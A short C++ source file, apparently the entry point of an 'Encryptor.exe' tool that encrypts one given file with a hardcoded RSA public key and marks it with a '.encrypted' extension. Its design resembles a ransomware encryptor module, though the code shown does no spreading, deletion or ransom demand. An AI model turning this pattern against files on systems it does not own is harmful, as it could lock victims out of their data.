#include "pch.h"
#include "Helper.h"

std::wstring TargetFile;
CryptoPP::RSA::PublicKey PubKey;

std::vector<uint8_t> PublicKeyBytes = { 0x30, 0x82, 0x01, 0x20, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0D, 0x00, 0x30, 0x82, 0x01, 0x08, 0x02, 0x82, 0x01, 0x01, 0x00, 0x99, 0x8F, 0xC2, 0x95, 0x34, 0x81, 0x4B, 0x56, 0x50, 0xED, 0xB3, 0x4D, 0x06, 0xF2, 0x7B, 0xFF, 0x64, 0x01, 0x7F, 0xB8, 0x55, 0x6F, 0xBD, 0xC2, 0xEA, 0x12, 0x6B, 0x69, 0xD4, 0x6F, 0x5B, 0x12, 0x58, 0x5E, 0x4D, 0xA9, 0x5B, 0xB9, 0x39, 0xFC, 0x34, 0xB9, 0xDE, 0x67, 0xFB, 0xF3, 0xDC, 0x8E, 0x29, 0xB3, 0xC4, 0xC1, 0x71, 0x4E, 0x07, 0x4B, 0xCE, 0x0D, 0x29, 0x40, 0xCC, 0xA3, 0xE8, 0xF5, 0xEA, 0x0E, 0x78, 0x36, 0xDA, 0x56, 0xB3, 0x6E, 0x78, 0xEC, 0x95, 0x64, 0x17, 0x34, 0xBB, 0xE2, 0x9C, 0x2F, 0x56, 0x17, 0xFF, 0x31, 0x4E, 0x6E, 0xFE, 0x93, 0x33, 0x1F, 0xCA, 0x80, 0xA8, 0xC1, 0xED, 0x55, 0x82, 0xEB, 0x6A, 0x14, 0xED, 0x08, 0xEA, 0x12, 0x9C, 0x30, 0xEB, 0xFD, 0x47, 0x6C, 0x71, 0x66, 0x2A, 0x6F, 0xF6, 0x1F, 0x59, 0x05, 0xDD, 0x52, 0x68, 0x34, 0x64, 0x35, 0xCA, 0xF1, 0x12, 0x18, 0xCA, 0x4D, 0x77, 0x8B, 0x56, 0x26, 0xC9, 0x2B, 0x0D, 0x1B, 0x6B, 0x95, 0xE2, 0xB7, 0xD5, 0x13, 0xCC, 0x92, 0x16, 0x5D, 0x5D, 0xE9, 0x6F, 0xFD, 0x22, 0x0F, 0x40, 0xAB, 0x96, 0xF5, 0x0D, 0x19, 0x4F, 0x24, 0x0A, 0x5D, 0x7D, 0xCC, 0xB8, 0x4E, 0x8F, 0x8D, 0x75, 0x9E, 0x7A, 0xA0, 0x80, 0xD5, 0x8E, 0x2F, 0x70, 0xE2, 0xF5, 0xFB, 0x2D, 0x79, 0x99, 0x56, 0xE0, 0xC2, 0xD4, 0xA8, 0xF1, 0x7B, 0x06, 0xC0, 0x7B, 0xBF, 0x8C, 0x8D, 0xA4, 0xF8, 0xF9, 0x63, 0xFA, 0x56, 0x43, 0x5C, 0x64, 0xCF, 0x95, 0x08, 0xA4, 0x6C, 0x14, 0x02, 0xD6, 0x5E, 0x81, 0x1B, 0xC2, 0x51, 0xC3, 0x89, 0x93, 0x5D, 0xAC, 0xAE, 0xF5, 0xA7, 0xD1, 0xDC, 0xE4, 0x81, 0x17, 0xC9, 0x75, 0x88, 0xCD, 0x0F, 0xF8, 0x9C, 0x2E, 0x4D, 0xE4, 0x59, 0x41, 0x2A, 0xBE, 0x4D, 0x1D, 0x92, 0x1E, 0x53, 0xD9, 0x95, 0x02, 0x01, 0x11 };

int main(int argc, wchar_t* argv[])
{
    if (!SetTargetFile(TargetFile)) {
        printf("Execution: Encryptor.exe path_to_file\n");
        return 1;
    }

    LoadKey(PublicKeyBytes, PubKey);

    std::wstring FileExtension = L".encrypted";

    if (!EncryptFileContent(TargetFile, FileExtension, PubKey)) {
        return 1;
    }

    return 0;
}
